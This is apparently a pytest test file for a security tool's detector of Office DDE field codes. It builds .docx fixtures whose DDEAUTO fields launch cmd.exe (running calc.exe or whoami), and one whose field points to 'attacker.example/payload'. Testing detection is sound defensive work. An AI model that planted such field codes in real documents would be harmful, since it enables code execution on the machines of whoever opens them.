"""Office DDE field-code detection.

DDE / DDEAUTO is a pre-macro execution vector: Word/Excel will exec
the named program at document-open via the field-update prompt. The
detection sits in OfficeDocumentAnalyzer._analyze_xml_content and
fires CRITICAL when DDE/DDEAUTO appears inside a real field-code
container (``<w:instrText>`` or ``<w:fldSimple w:instr=…>``).

Earlier versions matched the bare word "DDE" anywhere in any XML line
which produced false positives on legitimate text. These tests pin
the corrected behavior so future refactors can't silently regress."""

import io
import os
import sys
import zipfile

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from structure import Structure, Severity
from Utils.password_broker import PasswordBroker


@pytest.fixture(autouse=True)
def _clear():
    Structure.clear_cache()
    PasswordBroker.clear()
    yield
    Structure.clear_cache()
    PasswordBroker.clear()


# Minimal OOXML scaffold — enough for OfficeDocumentAnalyzer to claim
# the file as a docx and run the XML-content scan.
_CONTENT_TYPES = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
"""

_ROOT_RELS = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"""


def _docx_with_document_xml(document_xml: bytes) -> bytes:
    """Build a minimal .docx whose word/document.xml contains
    *document_xml* (raw bytes — caller controls XML)."""
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", _CONTENT_TYPES)
        zf.writestr("_rels/.rels", _ROOT_RELS)
        zf.writestr("word/document.xml", document_xml)
    return bio.getvalue()


# ---------------------------------------------------------------
# DDEAUTO via <w:instrText> field-code instruction
# ---------------------------------------------------------------

DDE_INSTRTEXT_DOC = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
      <w:r><w:instrText> DDEAUTO "C:\\\\Windows\\\\System32\\\\cmd.exe" "/k calc.exe" </w:instrText></w:r>
      <w:r><w:fldChar w:fldCharType="end"/></w:r>
    </w:p>
  </w:body>
</w:document>
"""


def test_dde_instrtext_detected():
    pytest.importorskip("xml.etree.ElementTree")
    s = Structure.create(
        data=_docx_with_document_xml(DDE_INSTRTEXT_DOC),
        filename="dde.docx",
        mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )
    dde = [k for k in s.analyzer.reports if k.startswith("dde_")]
    assert dde, list(s.analyzer.reports)
    rep = s.analyzer.reports[dde[0]]
    assert rep.severity == Severity.CRITICAL
    assert "cmd.exe" in rep.text
    assert "calc.exe" in rep.text
    # Structured data: targets enumerated, not just a string blob
    assert rep.data["targets"]
    assert any("cmd.exe" in t for t in rep.data["targets"])


# ---------------------------------------------------------------
# DDEAUTO via <w:fldSimple w:instr="…">
# ---------------------------------------------------------------

DDE_FLDSIMPLE_DOC = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:fldSimple w:instr="DDEAUTO &quot;cmd.exe&quot; &quot;/c whoami&quot;">
        <w:r><w:t>placeholder</w:t></w:r>
      </w:fldSimple>
    </w:p>
  </w:body>
</w:document>
"""


def test_dde_fldsimple_detected():
    s = Structure.create(
        data=_docx_with_document_xml(DDE_FLDSIMPLE_DOC),
        filename="dde2.docx",
        mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )
    dde = [k for k in s.analyzer.reports if k.startswith("dde_")]
    assert dde
    rep = s.analyzer.reports[dde[0]]
    assert rep.severity == Severity.CRITICAL
    assert "cmd.exe" in rep.text
    assert rep.data["source"] == "fldSimple"


# ---------------------------------------------------------------
# False-positive guard — bare word "DDE" in legitimate text
# ---------------------------------------------------------------

LEGIT_DDE_AS_WORD = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>The DDE protocol was deprecated in 2017.</w:t></w:r></w:p>
    <w:p><w:r><w:t>Article: DDEAUTO history</w:t></w:r></w:p>
  </w:body>
</w:document>
"""


def test_dde_false_positive_guard_legitimate_text():
    """Bare 'DDE' or 'DDEAUTO' in regular paragraph text must NOT fire.
    Only field-code containers (instrText / fldSimple instr=) qualify.
    Earlier implementation matched these as CRITICAL — regression
    guard so future cleanup doesn't reintroduce the FP."""
    s = Structure.create(
        data=_docx_with_document_xml(LEGIT_DDE_AS_WORD),
        filename="legit.docx",
        mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )
    dde = [k for k in s.analyzer.reports if k.startswith("dde_")]
    assert dde == [], (
        "DDE detector must not fire on bare 'DDE'/'DDEAUTO' in body text; "
        f"reports: {dde}"
    )


# ---------------------------------------------------------------
# IOC propagation — DDE target ends up in root iocs_aggregate
# ---------------------------------------------------------------


def test_dde_target_flows_to_iocs_aggregate():
    """The harvested executable path / argument should land in the
    root iocs_aggregate via the standard report-text harvesting path
    (no special wiring needed — _build_ioc_aggregate runs extract_iocs
    on every Report.text)."""
    DDE_WITH_URL = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:fldSimple w:instr="DDEAUTO &quot;https://attacker.example/payload&quot; &quot;arg&quot;">
        <w:r><w:t>x</w:t></w:r>
      </w:fldSimple>
    </w:p>
  </w:body>
</w:document>
"""
    s = Structure.create(
        data=_docx_with_document_xml(DDE_WITH_URL),
        filename="dde-url.docx",
        mime_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )
    agg = s.analyzer.reports.get("iocs_aggregate")
    assert agg is not None
    # Defang propagated through extract_iocs
    assert ("attacker.example" in agg.text
            or "attacker[.]example" in agg.text), agg.text
